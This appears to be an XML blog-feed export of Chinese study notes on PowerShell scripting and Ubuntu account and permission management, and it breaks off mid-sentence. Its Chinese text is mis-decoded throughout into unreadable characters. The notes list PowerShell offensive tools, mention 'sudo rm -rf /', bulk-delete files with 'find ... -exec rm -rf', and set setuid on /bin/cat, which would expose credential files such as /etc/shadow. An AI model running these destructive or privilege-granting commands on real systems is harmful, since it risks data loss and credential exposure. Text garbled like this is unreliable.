#æŸ¥çœ‹å…·ä½“ç¯å¢ƒå˜é‡çš„å€¼ $env:windir # æ–°å»ºç”¨æˆ·ç¯å¢ƒå˜é‡(ä¸´æ—¶) $env:name="xxx" # æ–°å»ºç¯å¢ƒå˜é‡(é•¿ä¹…) xxx # åœ¨ç¯å¢ƒå˜é‡çš„PATHä¸‹æ·»åŠ ä¸€æ¡å†…å®¹ $Env:path=$Env:Path+";C:\Go\bin" # .netæ–¹å¼åªå¯¹ç”¨æˆ·å˜é‡ç”Ÿæ•ˆ [environment]::setenvironment("PATH","D:\","User") # .netè·å–å€¼ [environment]::getenvironment("PATH","User") # åˆ é™¤ç¯å¢ƒå˜é‡ del env:name #æˆ– remove-item env:name åœ¨å…¶ä»–è„šæœ¬ä¸­ä½¿ç”¨powershell#æ¯”å¦‚bat @echo off powershell "&amp;'c:\Users\test\e.psl'" Powershellæ¡ä»¶åˆ¤æ–­æ¡ä»¶æ“ä½œç¬¦-eq ç­‰äº -ne ä¸ç­‰ä¸ -gt å¤§äº -lt å°äº -le å°äºç­‰äº -contains #å¸ƒå°” -not å–å -ant -or -xor # æ¯”å¦‚ï¼š 80 -eq 70 1gb -gt lmb (1,2,3) -contains 2 ifè¯­å¥å†™è„šæœ¬ç¼–è¾‘å™¨ISEé‡Œé¢äº† $num=56 if($num -gt 50 -and $num -lt 60) { "å¤§äº50ä¸”å°äº60" } elseif($num -eq 50) { "ç­‰äº50" } else { "å°äº50" } switchè¯­å¥$num=45 switch($num) { {($_ -lt 50) -and ($_ -gt 40)} {"å°äº50ä¸”å¤§äº40"} 50 {"ç­‰äº50"} {$_ -gt 50} {"å¤§äº50"} } Powershellå¾ªç¯ç»“æ„foreachè¯­å¥$arr=1..10 foreach ($n in $arr) { if($n -gt 5) { $n } } æ‰“å°è·¯å¾„ä¸­å¤§å°å¤§äºå¤šå°‘çš„æ–‡ä»¶ $pat_val=dir D:\antSword foreach ($file in $pat_val) { if($file.length -gt 1kb) { $file.name } } whileè¯­å¥while $num=15 while($num -ge 10) { $num $num -- } do â€¦ while(å…ˆè¿è¡Œä¸€æ¬¡) $num=15 do { $num $num -- }while($num -ge 10) continueä¸breakbreak $num=1 while($num -le 10) { if($num -eq 4) { break }else { $num } $num++ } continue $num=1 while($num -lt 10) { if($num -eq 4) { $num++ continue }else { $num $num++ } } forè¯­å¥$num=0 for($i=1; $i -le 100; $i++) { $sum+=$i $sum } switchå®ç°å¾ªç¯$num=1..10 switch($num) { {($_ % 2) -eq 0}{"æ­¤æ•°å€¼æ˜¯å¶æ•°ï¼š$_"} {($_ % 2) -ne 0}{"æ­¤æ•°å€¼æ˜¯å¥‡æ•°ï¼š$_"} default{"num=$_"} } Powershellæ•°ç»„æ•°ç»„çš„åˆ›å»º# 1. $arr=1,2,3,4 # 2. $arr=1..5 # 3.å¯ä»¥æ”¯æŒä¸åŒç±»å‹çš„å€¼ $arr=1,"hhh",(get-date) # 4.ç©ºæ•°ç»„ $arr=@() # 5.æœ‰ä¸ªé€—å·å°±è¡Œ $arr=,1 # 6. å‘½ä»¤æ‰§è¡Œç»“æœçš„æ¯ä¸€è¡Œä½œä¸ºä¸€ä¸ªæ•°ç»„å…ƒç´  $arr=ipconfig #åˆ¤æ–­æ˜¯å¦ä¸ºæ•°ç»„ $arr -is [array] è®¿é—®æ•°ç»„$arr[0] $arr[-1] $arr[0..2] # å–å‡º0,1,2 $arr.Count # å…ƒç´ ä¸ªæ•° $arr[($arr.Count)..0] # å€’åº $arr+="haha" # å¢åŠ å…ƒç´  Powershellå‡½æ•°è‡ªå®šä¹‰å‡½æ•°åŠè°ƒç”¨function test { ping www.xpshuai.cn. } test # è°ƒç”¨ ä¼ å‚ function test($site) { ping $site } test www.xpshuai.cn # è°ƒç”¨ # å¤šä¸ªå‚æ•° test p1 p2 å‡½æ•°è¿”å›å€¼function add($n1, $n2) { $c=$n1,$n2 $sum=$n1+$n2; $sum.gettype().fullname # æ•°æ®ç±»å‹ if($sum.gettype().fullname -eq "System.Double") { "cä¸ºæ•°ç»„ï¼Œç´¢å¼•å–å€¼: $c[0]" return $n1,$n2,$sum,"doubleæµ®ç‚¹æ•°" } return $n1,$n2,$sum } add 1 2.5 # è°ƒç”¨ Powershellå®šä¹‰æ–‡æœ¬powershellä¸­è½¬ä¹‰ç¬¦æ˜¯åå¼•å· "helloå…ˆæ‰§è¡Œå‘½ä»¤: $(Get-Date)" "helloè¡¨è¾¾å¼: $(5*6)" "å•åŒå¼•å·hello, my name is 'å“ˆå“ˆ'" "éƒ½ç”¨åŒå¼•å·ï¼Œç”¨åå¼•å·è½¬ä¹‰ï¼šhello, my name is `"å“ˆå“ˆ`"" # æ¢è¡Œç¬¦:`n å›è½¦: `r "ä½ å¥½å•Š `n æœ‹å‹ `n æˆ‘æ¢è¡Œå•¦" Powershellå®ç°ç”¨æˆ·äº¤äº’read-host $input=read-host "è¯·è¾“å…¥ç”¨æˆ·å" "æ‚¨å¥½ï¼Œä½ è¾“å…¥ä»ç”¨æˆ·åä¸º: $input" Powershellæ ¼å¼åŒ–å­—ç¬¦ä¸²# æ ¼å¼åŒ–ä¹‹å‰ $name="lili" $age=20 $gender="girl" "My name is $name, i am $age years old, and i am a $gender" # æ ¼å¼åŒ– -f $name="lili" $age=20 $gender="girl" "My name is {0}, i am {1} years old, and i am a {2}, {3}." -f $name,$age,$gender,$(3*6) #è¿ç®—çš„è¯ï¼Œå°½é‡ç”¨å°æ‹¬å·æ‹¬èµ·æ¥ Stringå¯¹è±¡æ–¹æ³•å¯¹å­—ç¬¦ä¸²çš„æ“ä½œ $str="D:\Desktop\Cobalt strike4\test\a.txt" $str.Split(".")[-1] # ä»¥.ç‚¹åˆ†å‰²ï¼Œç„¶åå–æœ€åä¸€ä½ $str.endswith("ll") # æ˜¯å¦ä»¥llç»“å°¾ $str.Contains("txt") # æ˜¯å¦åŒ…å«æŸä¸ªå­—ç¬¦ä¸² $str.CompareTo("D:\Desktop\Cobalt strike4\test\a.txt") # åˆ¤æ–­ä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ç›¸ç­‰ $str.IndexOf("w") # æ‰¾å‡ºwçš„ç´¢å¼•ä½ç½® $str.Insert(3,"hhh") # åœ¨ç´¢å¼•3åœ°æ–¹æ’å…¥hhh $str.Replace("c","C") # æ›¿æ¢ $str.Remove(0) # åˆ é™¤ Powershellæ“ä½œæ³¨å†Œè¡¨#åˆ‡æ¢åˆ°æ ¹é”® cd hkcu: cd .. exit # åˆ‡æ¢åˆ°åˆ«çš„æ ¹é”® cd HKLM: # è·å– get-ItemProperty # è®¾ç½® set-ItemProperty # ç§»é™¤ remove-ItemProperty # ç­‰ç­‰å…¶ä»– å‘½ä»¤ æè¿° Dir, Get-ChildItem åˆ—å‡ºé”®çš„å†…å®¹ Cd, Set-Location æ›´æ”¹å½“å‰ï¼ˆé”®ï¼‰ç›®å½• HKCU:, HKLM: é¢„å®šä¹‰çš„ä¸¤ä¸ªé‡è¦æ³¨å†Œè¡¨æ ¹ç›®å½•è™šæ‹Ÿé©±åŠ¨å™¨ Get-ItemProperty è¯»å–é”®çš„å€¼ Set-ItemProperty è®¾ç½®é”®çš„å€¼ New-ItemProperty ç»™é”®åˆ›å»ºä¸€ä¸ªæ–°å€¼ Clear-ItemProperty åˆ é™¤é”®çš„å€¼å†…å®¹ Remove-ItemProperty åˆ é™¤é”®çš„å€¼ New-Item, md åˆ›å»ºä¸€ä¸ªæ–°é”® Remove-Item, Del åˆ é™¤ä¸€ä¸ªé”® Test-Path éªŒè¯é”®æ˜¯å¦å­˜åœ¨ Powershellæ–‡ä»¶æ“ä½œ# æ–°å»ºç›®å½• New-Item xxxx -type directory # æˆ–è€… md test # æ–°å»ºæ–‡ä»¶ New-Item xxxx.txt -type File # åˆ é™¤ç›®å½• Remove-Item test # æ˜¾ç¤ºæ–‡æœ¬å†…å®¹ Get-Content test.txt # è®¾ç½®æ–‡æœ¬å†…å®¹ Set-Content .\test.txt -Value "å“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆ" # è¿½åŠ å†…å®¹ Add-Content .\test.txt -Value "å˜»å˜»å˜»å˜»å˜»å˜»å˜»å˜»" # æ¸…é™¤å†…å®¹ Clear-Content .\test.txt å¸¸ç”¨çš„PowerShellæ”»å‡»å·¥å…·ï¼š PowerSploit NiShang Empire (åŸºäºPowerShellçš„è¿œæ§æœ¨é©¬) PowerCat (PowerShellç‰ˆçš„NetCat) å…¶ä»–æŠ€å·§â€¦ â€¦ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>PowerShell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-è´¦å·ç®¡ç†]]></title>
    <url>%2Fposts%2F19367%2F</url>
    <content type="text"><![CDATA[â€‹ ç”¨æˆ·è´¦å·ç®¡ç†åŸºç¡€ç”¨æˆ·è´¦å·ç®¡ç† ä¸ºæ–°å‘˜å·¥åˆ›å»ºè´¦å· ä¿®æ”¹è´¦å·å¯†ç ç­–ç•¥ ç¦ç”¨ä¼‘å‡å‘˜å·¥è´¦å· åˆ é™¤ç¦»èŒå‘˜å·¥è´¦å·(ä¸€èˆ¬å…ˆç¦ç”¨, å¦‚æœè¦åˆ é™¤, æ³¨æ„æå‰æŠŠé‡è¦æ–‡ä»¶å¤‡ä»½) è®¾ç½®è´¦å·è®¿é—®æƒé™(åªèµ‹äºˆå…¶å·¥ä½œå¿…éœ€çš„æƒé™) æ¯ä¸ªäººä¿ç®¡è‡ªå·±çš„å¯†ç  ä¸è¦å°†å¯†ç æ³„éœ²ç»™ä»»ä½•äºº ä¿è¯å¯†ç å¤æ‚åº¦ ä¸è¦å°†å¯†ç å†™åœ¨çº¸æ¡è´´åœ¨é™åˆ¶å™¨ä¸Š å…³äºLinuxè´¦å·ç®¡ç†åŸºç¡€çŸ¥è¯†Rootè´¦å· èƒ½åšä»»ä½•äº‹æƒ…ï¼ˆç”šè‡³åˆ é™¤æ“ä½œç³»ç»Ÿè‡ªèº«ï¼‰ å¤§éƒ¨åˆ†Linuxå‘è¡Œç‰ˆå®‰è£…æ—¶è¦æ±‚è®¾ç½®rootè´¦å·å¯†ç  è€ŒUbuntué»˜è®¤ç¦ç”¨Rootè´¦å· å¯sudoæˆ–ä¸´æ—¶åˆ‡æ¢ä¸ºrootè´¦å· å¯æ‰‹åŠ¨å¯ç”¨rootè´¦å· å¹³æ—¶ä»¥æ™®é€šå‘˜å·¥è´¦å·ç®¡ç†è®¡ç®—æœº åœ¨Ubuntuä¸­æ‰§è¡Œsudo rm -rf /åï¼Œæœ‰æç¤º å®‰è£…è¿‡ç¨‹ä¸­åˆ›å»ºç®¡ç†å‘˜ä¸ªäººè´¦å·ï¼š ä½œä¸ºæ—¥å¸¸ç®¡ç†ä½¿ç”¨ åˆ›å»ºè´¦å· # æœ¬æœºç”¨æˆ·è´¦å·å­˜å‚¨æ–‡ä»¶: `/etc/passwd` # å†’å·åˆ†éš”ï¼šç¬¬äºŒåˆ—æ˜¯å ä½ç¬¦(xæ¥ä»£æ›¿å¯†ç ï¼Œæ­¤æ–‡ä»¶ä¸å­˜å‚¨å¯†ç ,åœ¨shadowä¸­)ï¼Œç¬¬ä¸‰å››åˆ—ï¼ˆuid,ç»„idï¼‰rootçš„idæ˜¯0ï¼Œç¬¬äº”åˆ—æ˜¯ç”¨æˆ·æè¿°ï¼Œç¬¬å…­åˆ—æ˜¯ä¸»ç›®å½•,æœ€åä¸€åˆ—æ˜¯ç»ˆç«¯ç±»å‹ # é€—å·åˆ†éš”çš„éƒ¨åˆ†ï¼š # åˆ›å»ºç”¨æˆ·ï¼ˆuseraddï¼‰ å»ºè®®æ·»åŠ -må‚æ•° useradd user01 -m # ä¸€èˆ¬æ˜¯è¿™æ ·ä½¿ç”¨å¤š useradd user01 -m -d /home/user01 # -dè‡ªå®šä¹‰ä¸»ç›®å½•ä½ç½®ï¼Œçˆ¶ç›®å½•å¿…é¡»æ˜¯å­˜åœ¨ # å¦‚æœåªæ˜¯sudo useradd user01 #æ˜¯æ²¡æœ‰ç”¨æˆ·å®¶ç›®å½•çš„ï¼Œä¸”è¯¥ç”¨æˆ·çš„ç»ˆç«¯ä¸ºsh # æ–°æ·»åŠ çš„è´¦å·çš„uidæ˜¯é€’å¢çš„ï¼ˆç³»ç»Ÿä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªå’Œuidç›¸åŒçš„ç»„idç»„è´¦å·ï¼‰ # å‚æ•°ï¼š -d # è´¦å·ä¸»ç›®å½•ï¼ˆå¤åˆ¶äº/etc/skelï¼‰ -m # åŒæ—¶åˆ›å»ºä¸»ç›®å½•ï¼ˆé»˜è®¤é¦–æ¬¡ç™»å½•æ—¶åˆ›å»ºä¸»ç›®å½•ï¼‰ ç”¨æˆ·ä¸»ç›®å½•å†…å®¹æ‹·è´è‡ª`/etc/skel` -c # å…¨åï¼ˆæè¿°,å³/etc/passwdä¸­ç¬¬äº”åˆ—é‚£ä¸ªï¼‰ -e # è´¦å·è¿‡æœŸï¼ˆYYYY-MM-DDï¼‰ -- é€‚åˆä¸´æ—¶å·¥ä½œçš„äºº -N # ä¸åˆ›å»ºåŒåç»„è´¦å·(gidä¼šé»˜è®¤è®¾ç½®ä¸º100) useradd user01 -m -N -g # æŒ‡å®šä¸»ç»„ï¼ˆå¿…é¡»å·²ç»å­˜åœ¨ï¼‰ useradd user01 -m -g sudo -G # é¢å¤–ç»„ # Note: è´¦å·åæœ€é•¿32ä¸ªå­—ç¬¦ï¼ˆä¸è¦ä»¥æ•°å­—æˆ–å…¶ä»–ç‰¹æ®Šå­—ç¬¦å¼€å¤´ï¼‰ # ç»™ç”¨æˆ·è®¾ç½®å¯†ç  sudo passwd user02 è´¦å·æ•°æ®åº“1./etc/passwdæ ¼å¼ï¼šç”¨æˆ·å:å¯†ç å ä½ç¬¦:UID:GID:å…¨å(æè¿°),æˆ¿é—´å·,å…¬å¸ç”µè¯,å®¶åº­ç”µè¯,others:ä¸»ç›®å½•:shell 2./etc/shadowå­˜æ”¾å¯†ç ç­‰å…¶ä»–ç›¸å…³ä¿¡æ¯, é»˜è®¤rootæ‰èƒ½æŸ¥çœ‹ä¸è¯»å†™æ ¼å¼ï¼šç”¨æˆ·å:å¯†ç :ä¸Šæ¬¡ä¿®æ”¹æ—¶é—´:å¯†ç æœ€å°ä½¿ç”¨æœŸé™:å¯†ç æœ€é•¿ä½¿ç”¨æœŸ:'å¯†ç 'è¿‡æœŸå‰å‡ å¤©æé†’:å¯†ç è¿‡æœŸå‡ å¤©åè´¦å·ä¼šè¢«é”å®š:'è´¦å·'è¿‡æœŸæ—¥(è·ç¦»1970-01-01çš„å¤©æ•°):ä¿ç•™ å¯†ç ä½ç½®ä¸º!ã€*çš„è´¦å·ä¸èƒ½ç›´æ¥ç™»é™†ç³»ç»Ÿ(å…¶ä»–è´¦å·ç™»å½•å¯åˆ‡æ¢ä¸ºå…¶è´¦å·) , !è¡¨ç¤ºå¯†ç è¢«é”å®š ä¸Šæ¬¡ä¿®æ”¹æ—¶é—´ï¼šè‡ªä»1970-01-01èµ·çš„å¤©æ•°ï¼Œå¦‚æœä¸º0è¡¨ç¤ºç”¨æˆ·ä¸‹æ¬¡ç™»é™†éœ€è¦ä¿®æ”¹å¯†ç ï¼Œç©ºè¡¨ç¤ºå…³é—­å¯†ç è¿‡æœŸåŠŸèƒ½(ä¸ä¼šè¢«é”å®š) å¯†ç æœ€é•¿ä½¿ç”¨æœŸé™&lt;å¯†ç æœ€å°ä½¿ç”¨æœŸ æ—¶å€™ï¼Œç”¨æˆ·æ— æ³•æ›´æ”¹å¯†ç (ä¸€èˆ¬ä¼šè®¾ç½®å¯†ç æœ‰æ•ˆæœŸä¸º90å¤©) å¯†ç è¿‡æœŸå‡ å¤©åè´¦å·ä¼šè¢«é”å®šï¼š è´¦å·è¿‡æœŸç”¨æˆ·ä¸èƒ½ç™»å½• å¯†ç è¿‡æœŸçœ‹æ˜¯å¦é”å®šè´¦å· è´¦æˆ·ä¿®æ”¹ï¼šå»ºè®®å¤šç™»é™†å‡ ä¸ªä¼šè¯å¤‡ç”¨ï¼Œé˜²æ­¢æ‰‹æ»‘å‡ºç°é—®é¢˜å¯¼è‡´ç™»ä¸ä¸Šå» è®¾ç½®è´¦å·å¯†ç  passwd user01 # å‚æ•°ï¼š -l # é”å®šè´¦æˆ·å¯†ç  sudo passwd -l user01 -u # è§£é”è´¦å· sudo passwd -u user01 -d # åˆ é™¤å¯†ç ï¼ˆè´¦å·æ— å¯†ç å¯ç™»å½•ï¼‰ -n/-x # å¯†ç æœ€å° / æœ€å¤§ ä½¿ç”¨æœŸé™ -w # å¯†ç è¿‡æœŸå‰å‡ å¤©å‘è­¦å‘Š -i # å¯†ç è¿‡æœŸåé”è´¦å· -e # å¯†ç ç«‹åˆ»è¿‡æœŸï¼ˆä¸‹æ¬¡ç™»å½•å¿…é¡»ä¿®æ”¹å¯†ç ï¼‰ -s # æŸ¥çœ‹è´¦å·çš„å¯†ç çŠ¶æ€(L é”å®š, Pæœ‰å¯†ç ,NPæ²¡å¯†ç  ) passwd -aS # æŸ¥çœ‹è´¦å·å¯†ç çŠ¶æ€ï¼ˆåŒä¸Šï¼‰ passwd -a -S æ·»åŠ è´¦å·adduser å‚æ•°å°‘ï¼Œæ›´ç®€æ´ adduser user02 # åŸºäºuseraddçš„perlè„šæœ¬ # å¹¶éæ‰€æœ‰Linuxå‘è¡Œç‰ˆä¸­éƒ½åŒ…å« # å‘å¯¼æ–¹å¼è¿è¡Œï¼ˆä¸éœ€è®°å¿†å‘½ä»¤å‚æ•°ï¼‰ # ä½ç½®ï¼š /usr/sbin/adduser # å¦ä¸€ä¸ªæ‰¹é‡æ·»åŠ è´¦å· newusers sudo newusers users.txt # æ–‡ä»¶å†…å®¹æŒ‰passwdæ ¼å¼å¡«å†™: user05:pass15:::hahaha:/home/user15:/bin/bash åˆ é™¤è´¦å·userdelæˆ–deluser sudo userdel user02 # ä¸ä¼šåˆ é™¤ä¸»ç›®å½• userdel -r user02 # åˆ é™¤è´¦å·åŒæ—¶åˆ é™¤ä¸»ç›®å½•ï¼ˆä¸€èˆ¬å…ˆç¦ç”¨å‡ ä¸ªæœˆç­‰åˆ°ä¸éœ€è¦ä¸€ä¸‹æ–‡ä»¶æ—¶å€™å†åˆ é™¤ä½†æ˜¯è¦æå‰å¤‡ä»½ï¼‰ userdel -f user02 # å¼ºåˆ¶åˆ é™¤æ–‡ä»¶ rm -rf /home/user02 # åˆ é™¤ç”¨æˆ·ä¸»ç›®å½• åˆ‡æ¢è´¦å· # åˆ‡æ¢åˆ°rootè´¦å· su # éœ€è¦è¾“å…¥rootå¯†ç ï¼ˆé»˜è®¤rootæ²¡å¯†ç ,å…ˆç»™rootè®¾å¯†ç [sudo passwd root]å†æ“ä½œï¼‰ sudo su # è¾“å…¥å½“å‰è´¦å·å¯†ç (æ˜¯è¾“å…¥çš„å½“å‰è´¦å·çš„å¯†ç ) sudo -i # åŒä¸Šï¼ˆrootå‰é¢çš„å‘½ä»¤æç¤ºç¬¦æ˜¯äº•å·ï¼‰ exité€€å‡ºåˆ°è‡ªå·±çš„å›è¯ sudo -s # åŒä¸Š # åˆ‡æ¢åˆ°å…¶ä»–è´¦å· su user01 # åˆ‡æ¢åˆ°å…¶ä»–è´¦å·ï¼ˆè¾“å…¥çš„user01çš„å¯†ç ï¼‰ sudo su user01 #åˆ‡æ¢åˆ°å…¶ä»–è´¦å·ï¼ˆè¾“å…¥çš„æ˜¯å½“å‰ç”¨æˆ·çš„å¯†ç ï¼‰ ç»„è´¦å·ç®¡ç† åˆ†ç»„å½’ç±»ç»Ÿä¸€ç®¡ç† å°†ç”¨æˆ·è´¦å·åˆ†ç»„ç®¡ç†å’ŒæŒ‡æ´¾æƒé™ ç”¨æˆ·åˆ›å»ºåŒæ—¶ç”ŸæˆåŒåçš„ç»„è´¦å· æ¯ä¸ªæ–‡ä»¶æœ‰å”¯ä¸€çš„æ‰€å±è´¦å·å’Œæ‰€å±ç»„ï¼ˆå±ä¸»ã€æ•°ç»„ï¼‰ æ¯ä¸ªç”¨æˆ·å¯ä»¥åŒå±å±äºå¤šä¸ªç»„ï¼Œä½†åªæœ‰ä¸€ä¸ªä¸»ç»„ æŸ¥çœ‹å½“å‰ç”¨æˆ·æ‰€å±çš„ç»„ï¼š groups cat /etc/groupsæ ¼å¼ï¼š ç»„å:å¯†ç (é€šå¸¸ä¸ä½¿ç”¨):GID:é€—å·åˆ†éš”çš„'æˆå‘˜'ç”¨æˆ·è´¦å· ç»„ç®¡ç† sudo groupadd g_name # æ·»åŠ ç»„ sudo groupdel g_name # åˆ é™¤ç»„ gpasswd -a u_name g_name # å°†ç”¨æˆ·åŠ å…¥'é¢å¤–ç»„' gpasswd -d u_name g_name # å°†ç”¨æˆ·ä»ç»„ä¸­åˆ é™¤ usermod -aG g_name user # å°†ç”¨æˆ·åŠ å…¥'é¢å¤–ç»„' aæ˜¯æ·»åŠ ,Gæ˜¯ç»„ # -a é™„ä»¶ï¼ˆå¦åˆ™æ›¿æ¢ï¼‰ usermod -g g_name user # ä¿®æ”¹ç”¨æˆ·çš„'ä¸»ç»„' -g æŠŠuser01çš„ä¸»ç»„æ”¹ä¸ºIT: sudo usermod -g IT user01 usermod -d /home/user2 user2 -m # å°†æŸç”¨æˆ·ä¸»ç›®å½•å†…å®¹ç§»åŠ¨åˆ°å½“å‰ç›®å½• usermod -l user2 user1 # å°†ç”¨æˆ·user1ä¿®æ”¹ä¸ºuser2(åªæ˜¯åç§°æ¢äº†ï¼Œå…¶ä»–çš„æƒé™å’Œidéƒ½ä¸å˜) # ç­‰ç­‰å…¶ä»–å‚æ•°...... å¯†ç ç­–ç•¥ä½¿ç”¨è¶³å¤Ÿå¤æ‚çš„å¯†ç Pluggable Authentication Module(PAM) # å®‰è£…pam apt install libpam-cracklib # vim /etc/pam.d/common-password å¢åŠ é…ç½® password required pam_pwhistory.so.remember=9 use_authok # æœ€è¿‘å‡ æ¬¡çš„å¯†ç ä¸èƒ½ç›¸åŒ æƒé™æ¯ä¸ªæ–‡ä»¶å’Œæ–‡ä»¶å¤¹æ‹¥æœ‰å”¯ä¸€çš„å±ä¸»å’Œå±ç»„ï¼ˆls -lï¼‰ æƒé™ç±»å‹ï¼š r, w, x è¯»ï¼Œå†™ï¼Œæ‰§è¡Œ 4, 2, 1 ï¼ˆè¿™ä¸ªæ•°å­—æ˜¯äºŒè¿›åˆ¶è½¬æ¢æ¥çš„ï¼Œå‡è®¾æ•°ç»„çš„æƒé™ä¸ºrâ€“,å¯¹åº”äºŒè¿›åˆ¶ä¸º100,è½¬ä¸ºåè¿›åˆ¶ä¸º4ï¼Œå…¶ä»–ç±»ä¼¼ï¼‰ uï¼Œgï¼Œo å±ä¸»ï¼Œå±ç»„ï¼Œå…¶ä»– # é™¤äº†ç¬¬ä¸€ä½ï¼Œåé¢æ¯ä¸‰ä½ä¸€ç»„ï¼ˆæ‰€æœ‰è€…uï¼Œæ‰€æœ‰ç»„gï¼Œå…¶ä»–ç”¨æˆ·oï¼‰ -rwxrwxrwx # æƒé™ æ–‡ä»¶ æ–‡ä»¶å¤¹ # R è¯»å–æ–‡ä»¶å†…å®¹ï¼Œæ‹·è´ åˆ—å‡ºç›®å½•å†…å®¹ # W æ›´æ”¹æ–‡ä»¶å†…å®¹ åˆ›å»ºã€åˆ é™¤æ–‡ä»¶åŠæ–‡ä»¶å¤¹ # X ä½œä¸ºåº”ç”¨ç¨‹åºæ‰§è¡Œæ–‡ä»¶ cdè¿›å…¥ï¼›è¯»å–æ–‡ä»¶å±æ€§å’Œæƒé™ æƒé™ä¿®æ”¹å‘½ä»¤ï¼šchmod ## åªæœ‰å…¶å±ä¸»å’Œrootå¯ä»¥ä¿®æ”¹æƒé™ ## å¯¹æ–‡ä»¶ # + - æ–¹å¼ chmod u+x a.txt chmod u-r a.txt chmod g-x a.txt chmod o+r a.txt # æ•°å­—æ–¹å¼ chmod 777 b.txt chmod 764 b.txt ## å¯¹ç›®å½•(ä¸€èˆ¬éƒ½ç»™xæƒé™ï¼Œä¸ç„¶cdä¸è¿›å») chmod u+x code/ chmod u-wx code/ # å¯¹ç›®å½•ï¼šråªèƒ½çœ‹åˆ°é‡Œé¢çš„æ–‡ä»¶ï¼Œè¦å†™çœ‹åˆ°å±æ€§ï¼Œå¾—åŠ xæƒé™ # çˆ¶çº§ç›®å½•çš„æƒé™/å­æ–‡ä»¶çš„æƒé™ # é€’å½’ä¿®æ”¹æƒé™ chmod 770 -R code/ ## æƒé™ä¸æœç´¢ find . -perm 770 # æœç´¢æƒé™ä¸º770çš„æ–‡ä»¶ # -type f åªæœæ–‡ä»¶ï¼› -type d åªæœç›®å½• find /path/dir/ -type f perm 664 -user xps -group xps # å±äºxpsç»„ï¼Œå±äºxpsç”¨æˆ·ï¼Œæƒé™ä¸º664çš„æ–‡ä»¶ find /path/dir/ -type f perm 755 -user xps -exec ls -l {}\; # æœç´¢å®Œä¹‹åæ‰§è¡Œå‘½ä»¤ find /path/dir/ -type f perm 755 -user xps -exec chmod 770 {}\; # æœç´¢å®Œä¹‹åå†è¿›è¡Œæƒé™ä¿®æ”¹ # å¦‚æœç”¨æˆ·åˆ äº†ï¼Œå¹¶ä¸”è¯¥ç”¨æˆ·æœ‰æ–‡ä»¶æ²¡åˆ é™¤å¹²å‡€ï¼Œä¸‹é¢æ‰¾åˆ°æ²¡æœ‰æ‰€å±ç”¨æˆ·çš„æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹ find /home -nouser -exec rm -rf {}\; # æŸ¥æ‰¾æ— æœ‰æ•ˆå±ä¸»å¯¹è±¡ï¼Œç„¶ååˆ é™¤ å±ä¸»ä¸å±ç»„ä¿®æ”¹å±ä¸»å’Œå±ç»„ # chownéœ€è¦sudo sudo chown user01 a.txt # ä¿®æ”¹a.txtçš„æ‰€æœ‰è€…ä¸ºuser01 sudo chown -R user01 /code # é€’å½’ä¿®æ”¹ç›®å½•çš„æ‰€æœ‰è€… # ä¿®æ”¹æ‰€æœ‰ç»„ä¸ºuser01 sudo chgrp user01 a.txt # æ‰€æœ‰è€…å’Œæ‰€æœ‰ç»„éƒ½ä¿®æ”¹ chown user01:user01 a.txt ç‰¹æ®Šæƒé™ Setuid(4)ä¸»è¦é’ˆå¯¹å¯æ‰§è¡Œç¨‹åºä¸€æ—¦è®¾ç½®äº†suidä¹‹åï¼šä»»ä½•ç”¨æˆ·æ‰§è¡Œç¨‹åºæ—¶éƒ½å…·å¤‡ä½¿ç”¨å±ä¸»çš„æƒé™è®¾ç½®ï¼šchmod u+s a.shæˆ–chmod 4777 /bin/cat (å‰é¢ä¸‰ä¸ªäºŒè¿›åˆ¶, äºŒè¿›åˆ¶ä¸º100,å³4ï¼›ç¬¬äºŒç§æ•°å€¼æ–¹å¼å¯¹é“¾æ¥ä¸ç”Ÿæ•ˆ)æ¯”å¦‚ä½¿ç”¨passwdä¿®æ”¹è‡ªå·±å¯†ç çš„æ—¶å€™ä¿®æ”¹çš„æ˜¯shadowæ–‡ä»¶(ä»–çš„å±ä¸»æ˜¯root)ï¼Œå®ƒå°±æ˜¯è®¾ç½®äº†sæƒé™ å¦‚æœä¸å¤ªæ‡‚ï¼Œå°½é‡ä¸è¦éšä¾¿è®¾ç½®suidï¼Œå¦åˆ™åæ‚£æ— ç©· Setgid(2)ä¸»è¦é’ˆå¯¹å¯æ‰§è¡Œç¨‹åºå’Œç›®å½•å¯¹äºç¨‹åºä¸€æ—¦è®¾ç½®äº†sgidï¼šä»»ä½•ç”¨æˆ·æ‰§è¡Œç¨‹åºæ—¶éƒ½å…·å¤‡ä½¿ç”¨å±ç»„çš„æƒé™åº”ç”¨äºç›®å½•æ—¶ï¼šå¯å®ç°å…±äº«æ–‡ä»¶è®¿é—®æ•ˆæœ(æ–°å»ºæ–‡ä»¶çš„æ•°ç»„é›†æˆç›®å½•å±ç»„): ä¸€ä¸ªç”¨æˆ·å†åœ¨é‡Œé¢æ–°å»ºæ–‡ä»¶ä¹‹åï¼Œä¸€ä¸ªç»„é‡Œçš„ç”¨æˆ·å°±éƒ½å¯ä»¥å…±äº«è®¾ç½®ï¼šchmod g+s code/æˆ–sudo chmod 2775 /bin/catè®¾ç½®å®Œä¹‹åï¼Œæ•°ç»„ä½ç½®æƒé™å°±å¤šäº†sæƒé™ stick bit(1)é’ˆå¯¹ç›®å½•çš„å—é™åˆ é™¤ä½ï¼ˆrootã€å±ä¸»å¯ä»¥åˆ ï¼‰å…¸å‹ä¾‹å­ï¼š/tmpç›®å½•è®¾ç½®ï¼š chmod o+t code/åŠ äº†stickä½(å…¶ä»–ç”¨æˆ·çš„ä½ç½®)ï¼Œè‡ªå·±åˆ›å»ºçš„æ–‡ä»¶åªæœ‰è‡ªå·±èƒ½åˆ é™¤ï¼Œåˆ«äººæ— æ³•åˆ é™¤ æƒé™ç®¡ç†æ©ç å†³å®šæ–‡ä»¶å’Œç›®å½•çš„é»˜è®¤æƒé™ - æ–‡ä»¶é»˜è®¤æƒé™ï¼š`666`-æ©ç ï¼ˆå¦‚æœæ©ç ä¸º002, 